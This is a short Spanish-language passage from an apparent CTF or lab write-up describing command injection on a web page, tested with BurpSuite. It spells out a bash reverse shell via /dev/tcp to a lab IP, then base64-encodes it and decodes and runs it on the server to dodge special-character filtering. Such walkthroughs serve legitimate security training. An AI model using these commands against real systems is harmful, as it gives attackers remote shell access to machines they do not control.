<h2>Explotación</h2>
Vamos a ver qué pasa si escribimos algún comando inofensivo. No parece que haga nada con por ejemplo `ls`. Vamos a investigar qué pasa por detrás con BurpSuite.

![[Pasted image 20260514125019.png]]

No parece que haya nada explotable. Vamos a probar a poner un listener y mandar una petición.

![[Pasted image 20260514125154.png]]

Parece que esto si que ha funcionado. Vamos a mandar una reverse shell.

El comando:

```bash
/bin/bash -i >& /dev/tcp/192.168.196.119/4444 0>&1
```

No funciona, puede que sea por caracteres especiales, así que vamos a encodearlo en base 64 y a hacer que se decodifique y ejecute en el servidor:

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.196.119/4444 0>&1" | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTk2LjExOS80NDQ0IDA+JjEK
```

Ahora le pasamos este comando a la página:

```bash
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTk2LjExOS80NDQ0IDA+JjEK" | base64 -d | /bin/bash
```
